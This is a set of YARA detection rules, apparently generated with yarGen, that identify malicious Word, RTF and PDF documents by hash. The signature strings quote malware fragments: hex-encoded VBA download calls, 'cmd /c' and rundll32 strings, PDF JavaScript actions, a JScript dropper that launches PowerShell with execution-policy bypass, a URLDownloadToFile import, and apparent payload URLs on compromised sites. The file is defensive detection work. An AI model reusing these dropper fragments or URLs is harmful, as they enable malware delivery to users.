/*
   YARA Rule Set
   Author: RamonOrtiz
   Date: 2021-08-15
   Identifier: DOC
   Reference: https://github.com/Neo23x0/yarGen
*/

/* Rule Set ----------------------------------------------------------------- */

rule f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8 {
   meta:
      description = "DOC - file f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8"
   strings:
      $s1 = "8a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a08" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO' */
      $s2 = "0a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a08" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO' */
      $s3 = "a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4' */
      $s4 = "43726561746522202B20224F626A6563742820222253637269" ascii /* hex encoded string 'Create" + "Object( ""Scri' */
      $s5 = "637574652822626161782E54797065203D2031222920272061" ascii /* hex encoded string 'cute("baax.Type = 1") ' a' */
      $s6 = "372A34353633343533342A283334363337383533342D333436" ascii /* hex encoded string '7*45634534*(346378534-346' */
      $s7 = "204F31424A455845432C204F42314A48544D4C46494C452C20" ascii /* hex encoded string ' O1BJEXEC, OB1JHTMLFILE, ' */
      $s8 = "37363234372D32373638373536372D39363736353736332D33" ascii /* hex encoded string '76247-27687567-96765763-3' */
      $s9 = "6F776E6C6F61642E22202B202266696C6522202B2022657869" ascii /* hex encoded string 'ownload." + "file" + "exi' */
      $s10 = "2A323738353633343837353433362F32353637353437363234" ascii /* hex encoded string '*2785634875436/2567547624' */
      $s11 = "20202020202020202062617365626173652E4E6F6465547970" ascii /* hex encoded string '         basebase.NodeTyp' */
      $s12 = "7873526D46305953413949484E6F5A57787362324A714C6D56" ascii /* hex encoded string 'xsRmF0YSA9IHNoZWxsb2JqLmV' */
      $s13 = "6E63203D20227574662D31366C652220456C73652078746578" ascii /* hex encoded string 'nc = "utf-16le" Else xtex' */
      $s14 = "333435383638393332343732332A3237383536333438373534" ascii /* hex encoded string '3458689324723*27856348754' */
      $s15 = "6C2063767774723579636276652C20427956616C2074727473" ascii /* hex encoded string 'l cvwtr5ycbve, ByVal trts' */
      $s16 = "336A3839756F746A663839336A74203D202232343332343233" ascii /* hex encoded string '3j89uotjf893jt = "2432423' */
      $s17 = "3839756F746A663839336A74203D2022323433323432332A32" ascii /* hex encoded string '89uotjf893jt = "2432423*2' */
      $s18 = "5452434F4D535045432C205354524353445645522C20535452" ascii /* hex encoded string 'TRCOMSPEC, STRCSDVER, STR' */
      $s19 = "2022323433323432332A32333435333536372F323238393537" ascii /* hex encoded string ' "2432423*23453567/228957' */
      $s20 = "6F7274203D206D696B6F202B2061676536344469636F646528" ascii /* hex encoded string 'ort = miko + age64Dicode(' */
   condition:
      uint16(0) == 0x5c7b and filesize < 700KB and
      8 of them
}

rule sig_79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619 {
   meta:
      description = "DOC - file 79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619"
   strings:
      $s1 = "0a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a08" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO' */
      $s2 = "a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4' */
      $s3 = "372A34353633343533342A283334363337383533342D333436" ascii /* hex encoded string '7*45634534*(346378534-346' */
      $s4 = "37363234372D32373638373536372D39363736353736332D33" ascii /* hex encoded string '76247-27687567-96765763-3' */
      $s5 = "2A323738353633343837353433362F32353637353437363234" ascii /* hex encoded string '*2785634875436/2567547624' */
      $s6 = "333435383638393332343732332A3237383536333438373534" ascii /* hex encoded string '3458689324723*27856348754' */
      $s7 = "336A3839756F746A663839336A74203D202232343332343233" ascii /* hex encoded string '3j89uotjf893jt = "2432423' */
      $s8 = "3839756F746A663839336A74203D2022323433323432332A32" ascii /* hex encoded string '89uotjf893jt = "2432423*2' */
      $s9 = "2022323433323432332A32333435333536372F323238393537" ascii /* hex encoded string ' "2432423*23453567/228957' */
      $s10 = "363772666769626766626E667237203D202239333933393537" ascii /* hex encoded string '67rfgibgfbnfr7 = "9393957' */
      $s11 = "33343837353433362F32353637353437363234372D32373638" ascii /* hex encoded string '34875436/25675476247-2768' */
      $s12 = "3238393537343534332B333435383638393332343732332A32" ascii /* hex encoded string '289574543+3458689324723*2' */
      $s13 = "6A3839756F746A663839336A74203D2022323433323432332A" ascii /* hex encoded string 'j89uotjf893jt = "2432423*' */
      $s14 = "3438363438342B333638393335363334383735363334373835" ascii /* hex encoded string '486484+368935634875634785' */
      $s15 = "347234336A3839756F746A663839336A74203D202232343332" ascii /* hex encoded string '4r43j89uotjf893jt = "2432' */
      $s16 = "35333536372F323238393537343534332B3334353836383933" ascii /* hex encoded string '53567/2289574543+34586893' */
      $s17 = "33362F32353637353437363234372D32373638373536372D39" ascii /* hex encoded string '36/25675476247-27687567-9' */
      $s18 = "363736353736332D33353637363438363438342B3336383933" ascii /* hex encoded string '6765763-35676486484+36893' */
      $s19 = "3D2022323433323432332A32333435333536372F3232383935" ascii /* hex encoded string '= "2432423*23453567/22895' */
      $s20 = "333933393537333734332A33343336343633342B3536333436" ascii /* hex encoded string '3939573743*34364634+56346' */
   condition:
      uint16(0) == 0x5c7b and filesize < 700KB and
      8 of them
}

rule e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33 {
   meta:
      description = "DOC - file e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33"
   strings:
      $s1 = "8a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a08" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO' */
      $s2 = "0a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a08" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO' */
      $s3 = "a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4' */
      $s4 = "37363234372D32373638373536372D39363736353736332D33" ascii /* hex encoded string '76247-27687567-96765763-3' */
      $s5 = "2A323738353633343837353433362F32353637353437363234" ascii /* hex encoded string '*2785634875436/2567547624' */
      $s6 = "333435383638393332343732332A3237383536333438373534" ascii /* hex encoded string '3458689324723*27856348754' */
      $s7 = "336A3839756F746A663839336A74203D202232343332343233" ascii /* hex encoded string '3j89uotjf893jt = "2432423' */
      $s8 = "3839756F746A663839336A74203D2022323433323432332A32" ascii /* hex encoded string '89uotjf893jt = "2432423*2' */
      $s9 = "2022323433323432332A32333435333536372F323238393537" ascii /* hex encoded string ' "2432423*23453567/228957' */
      $s10 = "33343837353433362F32353637353437363234372D32373638" ascii /* hex encoded string '34875436/25675476247-2768' */
      $s11 = "3238393537343534332B333435383638393332343732332A32" ascii /* hex encoded string '289574543+3458689324723*2' */
      $s12 = "6A3839756F746A663839336A74203D2022323433323432332A" ascii /* hex encoded string 'j89uotjf893jt = "2432423*' */
      $s13 = "3438363438342B333638393335363334383735363334373835" ascii /* hex encoded string '486484+368935634875634785' */
      $s14 = "347234336A3839756F746A663839336A74203D202232343332" ascii /* hex encoded string '4r43j89uotjf893jt = "2432' */
      $s15 = "35333536372F323238393537343534332B3334353836383933" ascii /* hex encoded string '53567/2289574543+34586893' */
      $s16 = "33362F32353637353437363234372D32373638373536372D39" ascii /* hex encoded string '36/25675476247-27687567-9' */
      $s17 = "363736353736332D33353637363438363438342B3336383933" ascii /* hex encoded string '6765763-35676486484+36893' */
      $s18 = "3D2022323433323432332A32333435333536372F3232383935" ascii /* hex encoded string '= "2432423*23453567/22895' */
      $s19 = "7061636b616765" ascii /* hex encoded string 'package' */
      $s20 = "3234372D32373638373536372D39363736353736332D333536" ascii /* hex encoded string '247-27687567-96765763-356' */
   condition:
      uint16(0) == 0x5c7b and filesize < 700KB and
      8 of them
}

rule sig_433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694 {
   meta:
      description = "DOC - file 433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694"
   strings:
      $s1 = "8a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a08" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO' */
      $s2 = "0a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a08" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO' */
      $s3 = "a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4' */
      $s4 = "37363234372D32373638373536372D39363736353736332D33" ascii /* hex encoded string '76247-27687567-96765763-3' */
      $s5 = "2A323738353633343837353433362F32353637353437363234" ascii /* hex encoded string '*2785634875436/2567547624' */
      $s6 = "333435383638393332343732332A3237383536333438373534" ascii /* hex encoded string '3458689324723*27856348754' */
      $s7 = "336A3839756F746A663839336A74203D202232343332343233" ascii /* hex encoded string '3j89uotjf893jt = "2432423' */
      $s8 = "3839756F746A663839336A74203D2022323433323432332A32" ascii /* hex encoded string '89uotjf893jt = "2432423*2' */
      $s9 = "2022323433323432332A32333435333536372F323238393537" ascii /* hex encoded string ' "2432423*23453567/228957' */
      $s10 = "33343837353433362F32353637353437363234372D32373638" ascii /* hex encoded string '34875436/25675476247-2768' */
      $s11 = "3238393537343534332B333435383638393332343732332A32" ascii /* hex encoded string '289574543+3458689324723*2' */
      $s12 = "6A3839756F746A663839336A74203D2022323433323432332A" ascii /* hex encoded string 'j89uotjf893jt = "2432423*' */
      $s13 = "3438363438342B333638393335363334383735363334373835" ascii /* hex encoded string '486484+368935634875634785' */
      $s14 = "347234336A3839756F746A663839336A74203D202232343332" ascii /* hex encoded string '4r43j89uotjf893jt = "2432' */
      $s15 = "35333536372F323238393537343534332B3334353836383933" ascii /* hex encoded string '53567/2289574543+34586893' */
      $s16 = "33362F32353637353437363234372D32373638373536372D39" ascii /* hex encoded string '36/25675476247-27687567-9' */
      $s17 = "363736353736332D33353637363438363438342B3336383933" ascii /* hex encoded string '6765763-35676486484+36893' */
      $s18 = "3D2022323433323432332A32333435333536372F3232383935" ascii /* hex encoded string '= "2432423*23453567/22895' */
      $s19 = "333933393537333734332A33343336343633342B3536333436" ascii /* hex encoded string '3939573743*34364634+56346' */
      $s20 = "7061636b616765" ascii /* hex encoded string 'package' */
   condition:
      uint16(0) == 0x5c7b and filesize < 700KB and
      8 of them
}

rule sig_455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7 {
   meta:
      description = "DOC - file 455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7"
   strings:
      $s1 = "8a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a08" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO' */
      $s2 = "0a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a08" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO' */
      $s3 = "a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4' */
      $s4 = "372A34353633343533342A283334363337383533342D333436" ascii /* hex encoded string '7*45634534*(346378534-346' */
      $s5 = "37363234372D32373638373536372D39363736353736332D33" ascii /* hex encoded string '76247-27687567-96765763-3' */
      $s6 = "2A323738353633343837353433362F32353637353437363234" ascii /* hex encoded string '*2785634875436/2567547624' */
      $s7 = "333435383638393332343732332A3237383536333438373534" ascii /* hex encoded string '3458689324723*27856348754' */
      $s8 = "336A3839756F746A663839336A74203D202232343332343233" ascii /* hex encoded string '3j89uotjf893jt = "2432423' */
      $s9 = "3839756F746A663839336A74203D2022323433323432332A32" ascii /* hex encoded string '89uotjf893jt = "2432423*2' */
      $s10 = "2022323433323432332A32333435333536372F323238393537" ascii /* hex encoded string ' "2432423*23453567/228957' */
      $s11 = "363772666769626766626E667237203D202239333933393537" ascii /* hex encoded string '67rfgibgfbnfr7 = "9393957' */
      $s12 = "33343837353433362F32353637353437363234372D32373638" ascii /* hex encoded string '34875436/25675476247-2768' */
      $s13 = "3238393537343534332B333435383638393332343732332A32" ascii /* hex encoded string '289574543+3458689324723*2' */
      $s14 = "6A3839756F746A663839336A74203D2022323433323432332A" ascii /* hex encoded string 'j89uotjf893jt = "2432423*' */
      $s15 = "3438363438342B333638393335363334383735363334373835" ascii /* hex encoded string '486484+368935634875634785' */
      $s16 = "347234336A3839756F746A663839336A74203D202232343332" ascii /* hex encoded string '4r43j89uotjf893jt = "2432' */
      $s17 = "35333536372F323238393537343534332B3334353836383933" ascii /* hex encoded string '53567/2289574543+34586893' */
      $s18 = "33362F32353637353437363234372D32373638373536372D39" ascii /* hex encoded string '36/25675476247-27687567-9' */
      $s19 = "363736353736332D33353637363438363438342B3336383933" ascii /* hex encoded string '6765763-35676486484+36893' */
      $s20 = "3D2022323433323432332A32333435333536372F3232383935" ascii /* hex encoded string '= "2432423*23453567/22895' */
   condition:
      uint16(0) == 0x5c7b and filesize < 700KB and
      8 of them
}

rule sig_5ea7a724d99fab3f05f50dccd57db59451334ac8640c532d426df319dad55c9e {
   meta:
      description = "DOC - file 5ea7a724d99fab3f05f50dccd57db59451334ac8640c532d426df319dad55c9e.pdf"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "5ea7a724d99fab3f05f50dccd57db59451334ac8640c532d426df319dad55c9e"
   strings:
      $s1 = "qqqqyy" fullword ascii /* reversed goodware string 'yyqqqq' */
      $s2 = "            xmlns:pdf=\"http://ns.adobe.com/pdf/1.3/\"" fullword ascii
      $s3 = "            xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\"" fullword ascii
      $s4 = "            xmlns:xmpMM=\"http://ns.adobe.com/xap/1.0/mm/\"" fullword ascii
      $s5 = "            xmlns:pdfx=\"http://ns.adobe.com/pdfx/1.3/\">" fullword ascii
      $s6 = "0R3R1R2R0" fullword ascii /* base64 encoded string 'GtuGdt' */
      $s7 = "SSS%%%" fullword ascii /* reversed goodware string '%%%SSS' */
      $s8 = "<</DecodeParms<</Columns 4/Predictor 12>>/Filter/FlateDecode/ID[<FB0C810DD593F54B865AA140E9B29259><B6F9C974D0AF734F856F33AD2E6A1" ascii
      $s9 = "<</DecodeParms<</Columns 5/Predictor 12>>/Filter/FlateDecode/ID[<FB0C810DD593F54B865AA140E9B29259><FE29CC1D5A17A14F80B1C5EC8AB6A" ascii
      $s10 = "<</DecodeParms<</Columns 4/Predictor 12>>/Filter/FlateDecode/ID[<FB0C810DD593F54B865AA140E9B29259><D9D209A6167CF34F959B5B43E7E2A" ascii
      $s11 = "<</ADBE_FT<</BreadCrumbs[<</Action(Set)/AppVersion(1)/Application(PDFMaker)/PDFLBuildDate(Sep 13 2017)/TimeStamp(D:2018040402162" ascii
      $s12 = "111)))" fullword ascii /* reversed goodware string ')))111' */
      $s13 = "<</DecodeParms<</Columns 4/Predictor 12>>/Filter/FlateDecode/ID[<FB0C810DD593F54B865AA140E9B29259><1AD6BA2816860940A3E900A4AF919" ascii
      $s14 = "W)))!!!" fullword ascii
      $s15 = "<</JS 533 0 R/S/JavaScript>>" fullword ascii
      $s16 = "<</JS 530 0 R/S/JavaScript>>" fullword ascii
      $s17 = "<</JS 508 0 R/S/JavaScript>>" fullword ascii
      $s18 = "<</EmbeddedFiles 497 0 R/JavaScript 493 0 R>>" fullword ascii
      $s19 = "<</Differences[24/breve/caron/circumflex/dotaccent/hungarumlaut/ogonek/ring/tilde 39/quotesingle 96/grave 128/bullet/dagger/dagg" ascii
      $s20 = "<</JS 536 0 R/S/JavaScript>>" fullword ascii
   condition:
      uint16(0) == 0x5025 and filesize < 2000KB and
      8 of them
}

rule sig_8e7fb6e2f5cab40baf71083b4406f993d482e945117f146efc9b2aeeb7772625 {
   meta:
      description = "DOC - file 8e7fb6e2f5cab40baf71083b4406f993d482e945117f146efc9b2aeeb7772625.docx"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "8e7fb6e2f5cab40baf71083b4406f993d482e945117f146efc9b2aeeb7772625"
   strings:
      $s1 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.8#0#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL#Micr" wide
      $s2 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.2#9#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VBA\\VBA7.1\\VBE7.DLL#" wide
      $s3 = "*\\G{00020905-0000-0000-C000-000000000046}#8.7#0#C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\MSWORD.OLB#Microsoft" wide
      $s4 = "cmd /c " fullword ascii
      $s5 = "cmd /c \"8 & " fullword ascii
      $s6 = " HYPERLINK \"http://gks.ru/bgd/Freeb04_03/LssWWW.exe/Stg/d01/249.htm\" " fullword wide
      $s7 = "http://gks.ru/bgd/Freeb04_03/LssWWW.exe/Stg/d01/249.htm" fullword wide
      $s8 = "*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\Windows\\SysWOW64\\stdole2.tlb#OLE Automation" fullword wide
      $s9 = "\\zx.tmp" fullword ascii
      $s10 = "rundll32 " fullword ascii
      $s11 = ": dvtu.customs.ru/index.php?option=com_content&view=category&id=80 " fullword wide
      $s12 = "<a:clrMap xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" bg1=\"lt1\" tx1=\"dk1\" bg2=\"lt2\" tx2=\"dk2\" acce" ascii
      $s13 = "53&75&5B~" fullword ascii /* hex encoded string 'Su[' */
      $s14 = "r Eastern regions of Russia and the countries of the Korean peninsula. There were revealed reasons for the slowing of economic c" ascii
      $s15 = "ooperation. It is concluded that the international economic sanctions did not reduce the interest of the Korean states in cooper" ascii
      $s16 = ". 225-226]. " fullword wide /* hex encoded string '"R&' */
      $s17 = "4870605,7" fullword wide /* hex encoded string 'Hp`W' */
      $s18 = "@MickeyB" fullword ascii
      $s19 = " Republic of Korea " fullword ascii
      $s20 = "USERPROF`ILE\")" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 400KB and
      8 of them
}

rule sig_7dd7fcb839e3d18745b8dfd20dc6ef4f0fd6bad46597b10ec7649a2f7f364d0a {
   meta:
      description = "DOC - file 7dd7fcb839e3d18745b8dfd20dc6ef4f0fd6bad46597b10ec7649a2f7f364d0a.docx"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "7dd7fcb839e3d18745b8dfd20dc6ef4f0fd6bad46597b10ec7649a2f7f364d0a"
   strings:
      $x1 = "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Word\\protection.png" fullword wide
      $s2 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.8#0#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL#Micr" wide
      $s3 = "brlakedrugs.com/wp-content/themes/twentyseventeen/template-parts/footer/0Zy3@U3*mTL3hUtu.php" fullword ascii
      $s4 = "agrege homologoumena profunditymonogrammerinoperabi ascriptions amorino mediated" fullword ascii
      $s5 = "https://thegoldprocess=:ClegU.co=:ClegUm/uploa=:ClegUds=:ClegU/=:ClegUblog/8xFQnsDivjqalDy.php" fullword ascii
      $s6 = "rphyroidsskeesbitum geologizeegestions noninfected oolitic bibliograp posteriorlybureaucraticjehadis antherozooid amenableness a" ascii
      $s7 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.2#9#C:\\PROGRA~2\\COMMON~1\\MICROS~1\\VBA\\VBA7.1\\VBE7.DLL#Visual Basic For Applic" wide
      $s8 = "reinjectedincompleteness literatelyantiferromagnetswatt jarovizingtrotyl lazing tal" fullword ascii
      $s9 = "centenarianisms encoded gander idolatryarmipotencesdedramatiz laborer sterling fragile under re" fullword ascii
      $s10 = "rockboundunisonancespranayamac chambertemperamentallycurtness loamedveriestheyedbilkers lotuslandsanalytici" fullword ascii
      $s11 = "unavoidablescripturesadjustmen polarisedparalogisticconstitue volumometers boasted" fullword ascii
      $s12 = "https://!+qFl+;www.t!+qFl+;hew!+qFl+;ordmarvel.com/wp-admin/OdvB!+qFl+;FxAFpv15Pc5.php" fullword ascii
      $s13 = "alinising irrenowned lyrists nimblessebalancenonexecutivesr cubismskababbingferr" fullword ascii
      $s14 = "substractionsrundlesauthorisms swashbuckled chloasma allogr" fullword ascii
      $s15 = "directors waygoose counterspyings impostedprocto" fullword ascii
      $s16 = "midrib tibias etheriseshellosokes hoarding iconophilists" fullword ascii
      $s17 = "vegetativevassail baselesslyferrocyanicbacteriop pustules pheezed disilluminate sociobiology alc" fullword ascii
      $s18 = "ali kroonsaxonitesenhypostatising logogriphic fustic" fullword ascii
      $s19 = "dfdll3CDHk&!2.exe " fullword ascii
      $s20 = "al physiopathologypostillatessub" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule d283a0d5cfed4d212cd76497920cf820472c5f138fd061f25e3cddf65190283f {
   meta:
      description = "DOC - file d283a0d5cfed4d212cd76497920cf820472c5f138fd061f25e3cddf65190283f.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "d283a0d5cfed4d212cd76497920cf820472c5f138fd061f25e3cddf65190283f"
   strings:
      $x1 = "var key = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\"; function de(input) { output = \"\"; i = 0; inpu" ascii
      $x2 = "js\"); findit(argv(0), \"\\\"^QWRkL\\\"\", \"y.ps1\"); sh.Run(\"wscript.exe yy.js\", 0); sh.Run(\"powershell.exe -ep bypass -f ." ascii
      $x3 = "sh.Run(s, 0); fs = new ActiveXObject(\"Scripting.FileSystemObject\"); while (1) { WScript.Sleep(10); if (!fs.FileExists(\"temp.t" ascii
      $x4 = " function findit(input, pattern, output) { s = \"cmd /c findstr /r \" + pattern + \" \\\"\" + input + \"\\\" > temp.txt\"; " fullword ascii
      $s5 = ")) { continue; } f = fs.GetFile(\"temp.txt\"); if (f.Size) { ts = f.OpenAsTextStream(1, -2); s = ts.ReadAll(); ts.Close(); break" ascii
      $s6 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.7#0#C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE15\\MSO.DLL#Microsoft " wide
      $s7 = "cmd /c cd /d %USERPROFILE% && type \"5" fullword ascii
      $s8 = "sh.Run(s, 0); fs = new ActiveXObject(\"Scripting.FileSystemObject\"); while (1) { WScript.Sleep(10); if (!fs.FileExists(\"temp.t" ascii
      $s9 = "YyBzdGF0aWMgZXh0ZXJuIGxvbmcgVVJMRG93bmxvYWRUb0ZpbGUoSW50UHRyIHBDYWxsZXIsIHN0cmluZyBzdHJVUkwsIHN0cmluZyBzdHJGaWxlTmFtZSwgdWludCB1" ascii /* base64 encoded string 'c static extern long URLDownloadToFile(IntPtr pCaller, string strURL, string strFileName, uint u' */
      $s10 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.2#9#C:\\PROGRA~1\\COMMON~1\\MICROS~1\\VBA\\VBA7.1\\VBE7.DLL#Visual Basic For Applic" wide
      $s11 = "*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\Windows\\System32\\stdole2.tlb#OLE Automation" fullword wide
      $s12 = "\" | findstr /r \"^var\" > y.js && wscript y.js \"" fullword ascii
      $s13 = "MSO.DLL#" fullword ascii
      $s14 = "input.replace(/[^A-Za-z0-9\\+\\/\\=]/g, \"\"); do { enc1 = key.indexOf(input.charAt(i++)); enc2 = key.indexOf(input.charAt(i++))" ascii
      $s15 = " HYPERLINK \"http://gks.ru/bgd/Freeb04_03/LssWWW.exe/Stg/d01/249.htm\" " fullword wide
      $s16 = "http://gks.ru/bgd/Freeb04_03/LssWWW.exe/Stg/d01/249.htm" fullword wide
      $s17 = "fs.DeleteFile(\"temp.txt\"); }} catch (e) {}" fullword ascii
      $s18 = "JSAmJiBkZWwgL2YgL3EgeS4qIiwgMCk7" fullword ascii /* base64 encoded string '% && del /f /q y.*", 0);' */
      $s19 = "*\\G{00020905-0000-0000-C000-000000000046}#8.6#0#C:\\Program Files\\Microsoft Office\\Office15\\MSWORD.OLB#Microsoft Word 15.0 O" wide
      $s20 = "h); return output; } try { argv = WScript.Arguments; sh = new ActiveXObject(\"WScript.Shell\"); findit(argv(0), \"\\\"^dHJ5I\\\"" ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_199b413b421644c1f385452967a4b287e792d6cc295427993fd696583cc1ab0c {
   meta:
      description = "DOC - file 199b413b421644c1f385452967a4b287e792d6cc295427993fd696583cc1ab0c.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "199b413b421644c1f385452967a4b287e792d6cc295427993fd696583cc1ab0c"
   strings:
      $s1 = "customXml/itemProps1.xml " fullword ascii
      $s2 = "customXml/itemProps1.xmlPK" fullword ascii
      $s3 = "customXml/item1.xml " fullword ascii
      $s4 = "customXml/_rels/item1.xml.relsPK" fullword ascii
      $s5 = "customXml/_rels/item1.xml.rels " fullword ascii
      $s6 = "word/_rels/settings.xml.relsPK" fullword ascii
